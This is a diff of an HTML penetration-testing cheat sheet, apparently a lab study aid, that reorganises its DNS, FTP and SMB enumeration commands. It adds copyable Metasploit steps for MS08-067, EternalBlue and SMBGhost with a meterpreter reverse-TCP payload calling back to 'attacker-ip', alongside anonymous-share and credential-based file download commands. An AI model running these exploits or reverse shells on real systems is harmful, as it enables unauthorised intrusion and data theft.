@@ -66,11 +66,10 @@
     <a href="pivoting.html">🔀 Pivoting</a>
     <a href="ad-enumeration.html">🧩 AD Enumeration</a>
 
-    <a href="ad-attacks.html">⚔️ AD Attacks</a>
+  <a href="ad-attacks.html">⚔️ AD Attacks I</a>
+    <a href="ad-attacks2.html">⚔️ AD Attacks II</a>
 
-    <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
-
-    <a href="cloud-security.html">☁️ Cloud</a>
+  <a href="ad-lateral-movement.html">🔀 AD Lateral Movement</a>
 
   </nav>
 
@@ -239,53 +238,327 @@
     </pre>
 
     </div>
-    <!-- FTP -->
-    <div class="section">
-    <h2>FTP</h2>
 
-    <p><strong>NSE – Enumeration & Vulnerability Detection</strong></p>
+    
+<!-- DNS -->
+<div class="section" id="dns-enum">
+  <h2>DNS</h2>
+
+  <p><strong>Nmap Scripting Scan</strong></p>
+
+  <p>DNS Enumeration</p>
     <pre>
-    <code>nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP</code>
-    <button class="copy-btn" data-copy="nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP">COPY</button>
+    <code>nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53</code>
+    <button class="copy-btn" data-copy="nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53">COPY</button>
     </pre>
 
-    <p><strong>Manual FTP Access</strong></p>
-    <pre>
-    <code>ftp $IP</code>
-    <button class="copy-btn" data-copy="ftp $IP">COPY</button>
-    </pre>
+  <!-- BANNER GRABBING -->
+  <p><strong>Banner Grabbing</strong></p>
+  <pre>
+<code>dig version.bind CHAOS TXT @&lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dig version.bind CHAOS TXT @<DNS_SERVER_IP>">COPY</button>
+  </pre>
 
-    <p><strong>Things to Check</strong></p>
-    <ul>
-        <li>Anonymous login (<code>anonymous:anonymous</code>)</li>
-        <li>Writable directories</li>
-        <li>File upload may lead to shell access</li>
-    </ul>
+  <pre>
+<code>nmap -sV --script dns-nsid &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="nmap -sV --script dns-nsid <DNS_SERVER_IP>">COPY</button>
+  </pre>
 
-    <p><strong>Upload Files</strong></p>
-    <pre>
-    <code>put $binary_file</code>
-    <button class="copy-btn" data-copy="put $binary_file">COPY</button>
-    </pre>
 
-    <p><strong>Download Files Recursively</strong></p>
-    <pre>
-    <code>wget -r ftp://[user]:[password]@[IP]/</code>
-    <button class="copy-btn" data-copy="wget -r ftp://[user]:[password]@[IP]/">COPY</button>
-    </pre>
+  <!-- ZONE TRANSFER -->
+  <p><strong>Zone Transfer (AXFR)</strong></p>
+  <pre>
+<code>dig axfr @&lt;DNS_SERVER_IP&gt; &lt;DOMAIN&gt;</code>
+<button class="copy-btn" data-copy="dig axfr @<DNS_SERVER_IP> <DOMAIN>">COPY</button>
+  </pre>
 
-    <p><strong>Search for Specific Files</strong></p>
-    <pre>
-    <code>find / -name [filename_pattern] 2>/dev/null</code>
-    <button class="copy-btn" data-copy="find / -name [filename_pattern] 2>/dev/null">COPY</button>
-    </pre>
 
-    <pre>
-    <code>find / -name Settings.* 2>/dev/null</code>
-    <button class="copy-btn" data-copy="find / -name Settings.* 2>/dev/null">COPY</button>
-    </pre>
+  <pre>
+<code>dnsrecon -t axfr -d &lt;DOMAIN&gt; -n &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dnsrecon -t axfr -d <DOMAIN> -n <DNS_SERVER_IP>">COPY</button>
+  </pre>
 
-    </div>
+  <!-- ANY QUERY -->
+  <p><strong>ANY Query Enumeration</strong></p>
+  <pre>
+<code>dig ANY &lt;DOMAIN&gt; @&lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dig ANY <DOMAIN> @<DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <pre>
+<code>dnsrecon -d &lt;DOMAIN&gt; -t any -n &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dnsrecon -d <DOMAIN> -t any -n <DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <!-- SUBDOMAIN BRUTE FORCE -->
+  <p><strong>Subdomain Brute-Forcing</strong></p>
+<pre><code>gobuster dns -d sauna.htb 
+-w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 15
+</code>
+<button class="copy-btn" data-copy='gobuster dns -d sauna.htb 
+-w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 15
+'>COPY</button>
+</pre>
+
+  <pre>
+<code>dnsrecon -D subdomains.txt -d &lt;DOMAIN&gt; -n &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dnsrecon -D subdomains.txt -d <DOMAIN> -n <DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+<pre>
+<code>ffuf -w wordlist.txt -u http://acura.htb -H "Host: test-FUZZ.acura.htb" -fs 0</code>
+<button
+  class="copy-btn"
+  data-copy='ffuf -w wordlist.txt -u http://acura.htb -H "Host: test-FUZZ.acura.htb" -fs 0'
+>
+  COPY
+</button>
+</pre>
+
+
+
+
+  <!-- REVERSE DNS -->
+  <p><strong>Reverse DNS Enumeration</strong></p>
+  <pre>
+<code>dnsrecon -r &lt;IP_RANGE&gt; -n &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dnsrecon -r <IP_RANGE> -n <DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <pre>
+<code>dig -x &lt;IP_ADDRESS&gt; @&lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dig -x <IP_ADDRESS> @<DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <!-- DNSSEC -->
+  <p><strong>DNSSEC Vulnerability Scanning</strong></p>
+  <pre>
+<code>nmap -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=&lt;DOMAIN&gt; &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="nmap -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=<DOMAIN> <DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <pre>
+<code>dig DNSKEY &lt;DOMAIN&gt; @&lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dig DNSKEY <DOMAIN> @<DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <!-- DNS RECURSION -->
+  <p><strong>DNS Recursion Testing</strong></p>
+  <pre>
+<code>dig google.com A @&lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dig google.com A @<DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <pre>
+<code>nmap --script dns-recursion &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="nmap --script dns-recursion <DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <!-- MAIL ENUM -->
+  <p><strong>Mail Server Enumeration via DNS</strong></p>
+  <pre>
+<code>dig MX &lt;DOMAIN&gt; @&lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dig MX <DOMAIN> @<DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <pre>
+<code>dig SRV _ldap._tcp.&lt;DOMAIN&gt; @&lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="dig SRV _ldap._tcp.<DOMAIN> @<DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <pre>
+<code>nmap --script dns-srv-enum --script-args dns-srv-enum.domain=&lt;DOMAIN&gt; &lt;DNS_SERVER_IP&gt;</code>
+<button class="copy-btn" data-copy="nmap --script dns-srv-enum --script-args dns-srv-enum.domain=<DOMAIN> <DNS_SERVER_IP>">COPY</button>
+  </pre>
+
+  <!-- ACTIVE DIRECTORY -->
+  <p><strong>Active Directory DNS Enumeration</strong></p>
+  <pre>
+<code>dig -t SRV _gc._tcp.&lt;DOMAIN&gt;</code>
+<button class="copy-btn" data-copy="dig -t SRV _gc._tcp.<DOMAIN>">COPY</button>
+  </pre>
+
+  <pre>
+<code>dig -t SRV _ldap._tcp.&lt;DOMAIN&gt;</code>
+<button class="copy-btn" data-copy="dig -t SRV _ldap._tcp.<DOMAIN>">COPY</button>
+  </pre>
+
+  <pre>
+<code>dig -t SRV _kerberos._tcp.&lt;DOMAIN&gt;</code>
+<button class="copy-btn" data-copy="dig -t SRV _kerberos._tcp.<DOMAIN>">COPY</button>
+  </pre>
+
+  <!-- IPV6 -->
+  <p><strong>IPv6 DNS Bruteforce</strong></p>
+  <pre>
+<code>dnsdict6 -t &lt;DOMAIN&gt;</code>
+<button class="copy-btn" data-copy="dnsdict6 -t <DOMAIN>">COPY</button>
+  </pre>
+
+  <pre>
+<code>dnsrevenum6 &lt;DNS_SERVER_IP&gt; &lt;IPV6_RANGE&gt;</code>
+<button class="copy-btn" data-copy="dnsrevenum6 <DNS_SERVER_IP> <IPV6_RANGE>">COPY</button>
+  </pre>
+
+
+
+  
+</p><strong>Enumerate DNS with PowerShell (Windows)</strong></p>
+<p>Queries DNS records directly from a Windows system.</p>
+
+<pre><code>Resolve-DnsName -Name domain.com -Server dns-server-ip -DnsOnly</code>
+<button class="copy-btn" data-copy="Resolve-DnsName -Name domain.com -Server dns-server-ip -DnsOnly">COPY</button>
+</pre>
+
+</div>
+<!-- ===================== -->
+<!-- FTP -->
+<!-- ===================== -->
+<div class="section">
+  <h2>FTP</h2>
+
+  <!-- NSE ENUMERATION -->
+  <p><strong>NSE – Enumeration & Vulnerability Detection</strong></p>
+  <pre>
+<code>nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP</code>
+<button class="copy-btn" data-copy="nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $IP">COPY</button>
+  </pre>
+
+  <!-- MANUAL FTP -->
+  <p><strong>Manual FTP Access</strong></p>
+  <pre>
+<code>ftp $IP</code>
+<button class="copy-btn" data-copy="ftp $IP">COPY</button>
+  </pre>
+
+  <!-- NETCAT BANNER -->
+  <p><strong>Service Banner / Version Detection</strong></p>
+  <pre>
+<code>nc -nv X.X.X.X 21</code>
+<button class="copy-btn" data-copy="nc -nv X.X.X.X 21">COPY</button>
+  </pre>
+
+  <!-- FTP COMMANDS -->
+  <p><strong>Common FTP Commands</strong></p>
+  <table class="custom-table">
+    <thead>
+      <tr>
+        <th>Command</th>
+        <th>Description</th>
+        <th>Usage</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>lcd</td>
+        <td>Change local directory</td>
+        <td><code>lcd /path/to/directory</code></td>
+      </tr>
+      <tr>
+        <td>cd</td>
+        <td>Change server directory</td>
+        <td><code>cd /path/to/directory</code></td>
+      </tr>
+      <tr>
+        <td>ls</td>
+        <td>List server files</td>
+        <td><code>ls</code></td>
+      </tr>
+      <tr>
+        <td>get</td>
+        <td>Download file</td>
+        <td><code>get file.txt</code></td>
+      </tr>
+      <tr>
+        <td>mget</td>
+        <td>Download multiple files</td>
+        <td><code>mget *.txt</code></td>
+      </tr>
+      <tr>
+        <td>put</td>
+        <td>Upload file</td>
+        <td><code>put file.txt</code></td>
+      </tr>
+      <tr>
+        <td>mput</td>
+        <td>Upload multiple files</td>
+        <td><code>mput *.txt</code></td>
+      </tr>
+      <tr>
+        <td>bin</td>
+        <td>Binary transfer mode</td>
+        <td><code>bin</code></td>
+      </tr>
+      <tr>
+        <td>ascii</td>
+        <td>ASCII transfer mode</td>
+        <td><code>ascii</code></td>
+      </tr>
+      <tr>
+        <td>quit</td>
+        <td>Exit FTP session</td>
+        <td><code>quit</code></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <!-- DOWNLOAD ALL FILES -->
+  <p><strong>Download All Files</strong></p>
+  <pre>
+<code>wget -m ftp://anonymous:anonymous@X.X.X.X</code>
+<button class="copy-btn" data-copy="wget -m ftp://anonymous:anonymous@X.X.X.X">COPY</button>
+  </pre>
+
+  <pre>
+<code>wget -r --user=&quot;USERNAME&quot; --password=&quot;PASSWORD&quot; ftp://VictIM_IP/</code>
+<button class="copy-btn" data-copy="wget -r --user=&quot;USERNAME&quot; --password=&quot;PASSWORD&quot; ftp://VictIM_IP/">COPY</button>
+  </pre>
+
+  <!-- SEARCH FILES -->
+  <p><strong>Search for Specific Files</strong></p>
+  <pre>
+<code>find / -name [filename_pattern] 2&gt;/dev/null</code>
+<button class="copy-btn" data-copy="find / -name [filename_pattern] 2>/dev/null">COPY</button>
+  </pre>
+
+  <pre>
+<code>find / -name Settings.* 2&gt;/dev/null</code>
+<button class="copy-btn" data-copy="find / -name Settings.* 2>/dev/null">COPY</button>
+  </pre>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
     <!-- SSH -->
@@ -454,78 +727,6 @@
     <pre>
     <code>nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP</code>
     <button class="copy-btn" data-copy="nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $IP">COPY</button>
-    </pre>
-
-    </div>
-
-<!-- DNS -->
-<div class="section">
-  <h2>DNS</h2>
-
-  <p><strong>Nmap Scripting Scan</strong></p>
-
-  <p>DNS Enumeration</p>
-    <pre>
-    <code>nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53</code>
-    <button class="copy-btn" data-copy="nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53">COPY</button>
-    </pre>
-
-    <p>Enumerate AD Domain via DNS</p>
-    <pre>
-    <code>nmap -p 53 --script "dns-nsid,dns-srv-enum"</code>
-    <button class="copy-btn" data-copy='nmap -p 53 --script "dns-nsid,dns-srv-enum"'>COPY</button>
-    </pre>
-
-    <p>Basic DNS Enumeration</p>
-    <pre>
-    <code>dig axfr @ &lt;domain&gt;</code>
-    <button class="copy-btn" data-copy="dig axfr @ <domain>">COPY</button>
-    </pre>
-
-    <pre>
-    <code>dig ANY @ &lt;domain&gt;</code>
-    <button class="copy-btn" data-copy="dig ANY @ <domain>">COPY</button>
-    </pre>
-
-    <pre>
-    <code>nslookup</code>
-    <button class="copy-btn" data-copy="nslookup">COPY</button>
-    </pre>
-
-    <pre>
-    <code>server &lt;dns-server&gt;
-    set type=any
-    &lt;domain&gt;</code>
-    <button class="copy-btn" data-copy="server <dns-server>">COPY</button>
-    </pre>
-
-    <p>Zone Transfer</p>
-    <pre>
-    <code>dnsrecon -d &lt;domain&gt; -n &lt;dns-server&gt; -t axfr</code>
-    <button class="copy-btn" data-copy="dnsrecon -d <domain> -n <dns-server> -t axfr">COPY</button>
-    </pre>
-
-    <pre>
-    <code>dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver &lt;dns-server&gt;</code>
-    <button class="copy-btn" data-copy="dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns-server>">COPY</button>
-    </pre>
-
-    <p>Reverse Lookup</p>
-    <pre>
-    <code>nmap -sL &lt;network-range&gt; | grep "Nmap scan report"</code>
-    <button class="copy-btn" data-copy='nmap -sL <network-range> | grep "Nmap scan report"'>COPY</button>
-    </pre>
-
-    <p>DNS Cache Snooping</p>
-    <pre>
-    <code>dig @&lt;dns-server&gt; -t A &lt;domain&gt; +norecurse</code>
-    <button class="copy-btn" data-copy="dig @<dns-server> -t A <domain> +norecurse">COPY</button>
-    </pre>
-
-    <p>Enumerate DNS with PowerShell (Windows)</p>
-    <pre>
-    <code>Resolve-DnsName -Name &lt;domain&gt; -Server &lt;dns-server&gt; -DnsOnly</code>
-    <button class="copy-btn" data-copy="Resolve-DnsName -Name <domain> -Server <dns-server> -DnsOnly">COPY</button>
     </pre>
 
     </div>
@@ -733,190 +934,174 @@
   </pre>
 
 </div>
+<div class="section" id="smb-enum">
 
+<h2>SMB</h2>
 
-<div class="section" id="smb">
-<h2>SMB / Host Enumeration</h2>
+<h3>Share Enumeration</h3>
 
-<h3>Host Enumeration</h3>
+<h4>smbclient</h4>
 
-<p>Nmap basic SMB scan</p>
-<p>Escanea los puertos SMB más comunes (139 y 445) para confirmar si el servicio SMB está activo en el host objetivo.</p>
-<pre><code>nmap -v -p 139,445 &lt;IP&gt;</code></pre>
+<p>Lists available SMB shares on the target using anonymous authentication.</p>
+<pre><code>smbclient -L //&lt;IP&gt; -U anonymous</code>
+<button class="copy-btn" data-copy="smbclient -L //&lt;IP&gt; -U anonymous">COPY</button>
+</pre>
 
-<p>SMB OS discovery</p>
-<p>Utiliza scripts NSE para identificar el sistema operativo remoto, hostname, dominio y versión de SMB. El flag unsafe permite pruebas más agresivas.</p>
-<pre><code>nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery &lt;IP&gt;</code></pre>
+<p>Enumerates SMB shares using valid username and password credentials.</p>
+<pre><code>smbclient -L //&lt;IP&gt; -U username%password</code>
+<button class="copy-btn" data-copy="smbclient -L //&lt;IP&gt; -U username%password">COPY</button>
+</pre>
 
-<p>NetBIOS scan</p>
-<p>Enumera nombres NetBIOS, equipos Windows y workgroups dentro de una red especificada.</p>
-<pre><code>sudo nbtscan -r 192.168.50.0/24</code></pre>
+<p>Connects directly to a specific SMB share using provided user credentials.</p>
+<pre><code>smbclient //&lt;IP&gt;/sharename -U username%password</code>
+<button class="copy-btn" data-copy="smbclient //&lt;IP&gt;/sharename -U username%password">COPY</button>
+</pre>
 
-<p>Windows network view</p>
-<p>Lista equipos y recursos visibles dentro de un dominio Windows.</p>
-<pre><code>net view \\&lt;domainName&gt; /all</code></pre>
+<h4>smbmap</h4>
 
-<h3>Nmap Scripting Scan</h3>
+<p>Displays accessible SMB shares and permissions for the target host.</p>
+<pre><code>smbmap -H &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="smbmap -H &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Enumerate SMB shares</p>
-<p>Enumera los recursos compartidos SMB accesibles en el objetivo.</p>
-<pre><code>nmap --script smb-enum-shares.nse -p445 &lt;IP&gt;</code></pre>
+<p>Enumerates SMB shares using authenticated credentials to reveal permissions.</p>
+<pre><code>smbmap -H &lt;IP&gt; -u username -p password</code>
+<button class="copy-btn" data-copy="smbmap -H &lt;IP&gt; -u username -p password">COPY</button>
+</pre>
 
-<p>Enumerate SMB users</p>
-<p>Intenta enumerar usuarios locales o de dominio a través de SMB.</p>
-<pre><code>nmap --script smb-enum-users.nse -p445 &lt;IP&gt;</code></pre>
+<p>Checks SMB share access using the guest account with no password.</p>
+<pre><code>smbmap -H &lt;IP&gt; -u guest -p ''</code>
+<button class="copy-btn" data-copy="smbmap -H &lt;IP&gt; -u guest -p ''">COPY</button>
+</pre>
 
-<p>Full SMB enumeration</p>
-<p>Enumera dominios, grupos, procesos, servicios, sesiones, shares y usuarios usando múltiples scripts SMB.</p>
-<pre><code>nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 &lt;IP&gt;</code></pre>
+<p>Recursively lists files and directories inside accessible SMB shares.</p>
+<pre><code>smbmap -H &lt;IP&gt; -u username -p password -r</code>
+<button class="copy-btn" data-copy="smbmap -H &lt;IP&gt; -u username -p password -r">COPY</button>
+</pre>
 
-<p>SMB vulnerability scan (generic)</p>
-<p>Escanea vulnerabilidades SMB conocidas excluyendo ataques DoS, incluyendo verificación de versiones.</p>
-<pre><code>nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;</code></pre>
+<h4>nxc</h4>
 
-<p>SMB vulnerability scan (specific CVEs)</p>
-<p>Busca vulnerabilidades SMB críticas como Conficker, MS08-067, MS17-010 (EternalBlue), entre otras.</p>
-<pre><code>nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 &lt;IP&gt;</code></pre>
+<p>Enumerates SMB shares using NetExec with valid user credentials.</p>
+<pre><code>netexec smb &lt;IP&gt; -u username -p 'password' --shares</code>
+<button class="copy-btn" data-copy="netexec smb &lt;IP&gt; -u username -p 'password' --shares">COPY</button>
+</pre>
 
-<p>Check SambaCry version</p>
-<p>Verifica si el objetivo es vulnerable a CVE-2017-7494 comprobando la versión de Samba.</p>
-<pre><code>nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 &lt;IP&gt;</code></pre>
+<p>Lists available SMB shares by authenticating as the guest user.</p>
+<pre><code>netexec smb &lt;IP&gt; --shares -u 'guest' -p ''</code>
+<button class="copy-btn" data-copy="netexec smb &lt;IP&gt; --shares -u 'guest' -p ''">COPY</button>
+</pre>
 
-<h3>Advanced Enumeration</h3>
+<h3>User and Group Enumeration</h3>
 
-<p>Network packet analysis</p>
-<p>Analiza tráfico SMB en el puerto 139 buscando patrones específicos en paquetes de red.</p>
-<pre><code>sudo ngrep -i -d 's.?a.?m.?b.?a.*[[:digit:]]' port 139</code></pre>
+<h4>enum4linux</h4>
 
-<p>List SMB shares</p>
-<p>Lista recursos compartidos SMB disponibles, incluso sin credenciales si el acceso anónimo está habilitado.</p>
-<pre><code>smbclient -L &lt;IP&gt;</code></pre>
+<p>Performs SMB enumeration using supplied credentials to gather user information.</p>
+<pre><code>enum4linux -u john -p password123 &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="enum4linux -u john -p password123 &lt;IP&gt;">COPY</button>
+</pre>
 
-<h3>SMB Enumeration with smbmap</h3>
+<p>Enumerates users, groups, and shares using anonymous SMB access.</p>
+<pre><code>enum4linux &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="enum4linux &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Enumerate shares (default)</p>
-<p>Muestra recursos compartidos SMB y permisos detectados.</p>
-<pre><code>smbmap -H &lt;IP&gt;</code></pre>
+<p>Runs full SMB enumeration including users, groups, shares, and policies.</p>
+<pre><code>enum4linux -a &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="enum4linux -a &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Anonymous enumeration</p>
-<p>Enumera shares utilizando credenciales vacías.</p>
-<pre><code>smbmap -u '' -p '' -H &lt;IP&gt;</code></pre>
+<p>Extracts only user account information from the SMB service.</p>
+<pre><code>enum4linux -U &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="enum4linux -U &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Guest enumeration</p>
-<p>Enumera recursos usando el usuario guest.</p>
-<pre><code>smbmap -u 'guest' -p '' -H &lt;IP&gt;</code></pre>
+<p>Enumerates only group information available through the SMB service.</p>
+<pre><code>enum4linux -G &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="enum4linux -G &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Recursive enumeration</p>
-<p>Enumera de forma recursiva el contenido de los shares accesibles.</p>
-<pre><code>smbmap -u '' -p '' -H &lt;IP&gt; -R</code></pre>
+<p>Retrieves password policy information from the SMB target.</p>
+<pre><code>enum4linux -P &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="enum4linux -P &lt;IP&gt;">COPY</button>
+</pre>
 
-<h3>SMB Enumeration with crackmapexec</h3>
+<h3>spider_plus</h3>
 
-<p>Basic SMB enumeration</p>
-<p>Detecta sistema operativo, dominio, SMB signing y versión.</p>
-<pre><code>crackmapexec smb &lt;IP&gt;</code></pre>
+<p>Recursively downloads accessible SMB files using the spider_plus NetExec module.</p>
+<pre><code>netexec smb &lt;IP&gt; -u username -p '' -M spider_plus</code>
+<button class="copy-btn" data-copy="netexec smb &lt;IP&gt; -u username -p '' -M spider_plus">COPY</button>
+</pre>
 
-<p>Anonymous login test</p>
-<p>Prueba acceso SMB con credenciales vacías.</p>
-<pre><code>crackmapexec smb &lt;IP&gt; -u '' -p ''</code></pre>
+<h3>CVE</h3>
 
-<p>Guest login test</p>
-<p>Prueba acceso SMB con usuario guest.</p>
-<pre><code>crackmapexec smb &lt;IP&gt; -u 'guest' -p ''</code></pre>
+<h4>MS08-067 (Netapi)</h4>
 
-<p>Enumerate shares</p>
-<p>Lista recursos compartidos disponibles mediante SMB.</p>
-<pre><code>crackmapexec smb &lt;IP&gt; -u '' -p '' --shares</code></pre>
+<p>Exploits a critical SMB NetAPI vulnerability enabling remote code execution on legacy Windows systems.</p>
+<pre><code>use exploit/windows/smb/ms08_067_netapi</code>
+<button class="copy-btn" data-copy="use exploit/windows/smb/ms08_067_netapi">COPY</button>
+</pre>
 
-<p>RID brute force</p>
-<p>Enumera usuarios y grupos usando fuerza bruta de RIDs.</p>
-<pre><code>crackmapexec smb &lt;IP&gt; -u guest -p "" --rid-brute</code></pre>
+<pre><code>set RHOSTS &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="set RHOSTS &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Authenticated enumeration</p>
-<p>Ejecuta enumeración SMB usando credenciales válidas.</p>
-<pre><code>crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code></pre>
+<pre><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>
+<button class="copy-btn" data-copy="set PAYLOAD windows/x64/meterpreter/reverse_tcp">COPY</button>
+</pre>
 
-<h3>User Enumeration with enum4linux</h3>
+<pre><code>set LHOST attacker-ip</code>
+<button class="copy-btn" data-copy="set LHOST attacker-ip">COPY</button>
+</pre>
 
-<p>Full domain enumeration</p>
-<p>Recolecta información completa del dominio, usuarios, grupos y shares.</p>
-<pre><code>enum4linux -a &lt;IP&gt;</code></pre>
+<pre><code>exploit</code>
+<button class="copy-btn" data-copy="exploit">COPY</button>
+</pre>
 
-<p>Anonymous and guest enumeration</p>
-<p>Prueba enumeración con acceso anónimo y guest.</p>
-<pre><code>enum4linux -a -u "" -p "" &lt;IP&gt; && enum4linux -a -u "guest" -p "" &lt;IP&gt;</code></pre>
+<h4>MS17-010 (EternalBlue)</h4>
 
-<p>Extract domain users</p>
-<p>Enumera usuarios del dominio.</p>
-<pre><code>enum4linux -U &lt;IP&gt;</code></pre>
+<p>Abuses the EternalBlue SMB vulnerability to execute code remotely on unpatched Windows hosts.</p>
+<pre><code>use exploit/windows/smb/ms17_010_eternalblue</code>
+<button class="copy-btn" data-copy="use exploit/windows/smb/ms17_010_eternalblue">COPY</button>
+</pre>
 
-<p>Extract domain shares</p>
-<p>Enumera recursos compartidos disponibles.</p>
-<pre><code>enum4linux -S &lt;IP&gt;</code></pre>
+<pre><code>set RHOSTS &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="set RHOSTS &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Extended enumeration</p>
-<p>Incluye información adicional como políticas, máquinas y listas extendidas.</p>
-<pre><code>enum4linux -a -M -l -d &lt;IP&gt; 2&gt;&amp;1</code></pre>
+<pre><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>
+<button class="copy-btn" data-copy="set PAYLOAD windows/x64/meterpreter/reverse_tcp">COPY</button>
+</pre>
 
-<h3>SMB Client Operations</h3>
+<pre><code>set LHOST attacker-ip</code>
+<button class="copy-btn" data-copy="set LHOST attacker-ip">COPY</button>
+</pre>
 
-<p>Anonymous share listing</p>
-<p>Lista shares SMB sin autenticación.</p>
-<pre><code>smbclient --no-pass -L //&lt;IP&gt;</code></pre>
+<pre><code>exploit</code>
+<button class="copy-btn" data-copy="exploit">COPY</button>
+</pre>
 
-<p>Authenticated share listing</p>
-<p>Lista shares usando un usuario válido.</p>
-<pre><code>smbclient -L //&lt;IP&gt; -U &lt;user&gt;</code></pre>
+<h4>SMBGhost (CVE-2020-0796)</h4>
 
-<p>Connect to share</p>
-<p>Conecta interactivamente a un recurso compartido.</p>
-<pre><code>smbclient //&lt;IP&gt;/</code></pre>
+<p>Targets SMBv3 compression flaw allowing unauthenticated remote code execution on vulnerable systems.</p>
+<pre><code>use exploit/windows/smb/cve_2020_0796_smbghost</code>
+<button class="copy-btn" data-copy="use exploit/windows/smb/cve_2020_0796_smbghost">COPY</button>
+</pre>
 
-<p>Anonymous connection</p>
-<p>Conexión SMB sin credenciales.</p>
-<pre><code>smbclient -N //&lt;IP&gt;/</code></pre>
+<pre><code>set RHOSTS &lt;IP&gt;</code>
+<button class="copy-btn" data-copy="set RHOSTS &lt;IP&gt;">COPY</button>
+</pre>
 
-<p>Download all files</p>
-<p>Descarga recursivamente todos los archivos del share.</p>
-<pre><code>smbclient //&lt;IP&gt;/ -U &lt;user&gt; -c "prompt OFF;recurse ON;mget *"</code></pre>
+<pre><code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>
+<button class="copy-btn" data-copy="set PAYLOAD windows/x64/meterpreter/reverse_tcp">COPY</button>
+</pre>
 
-<h3>Brute Force Credentials</h3>
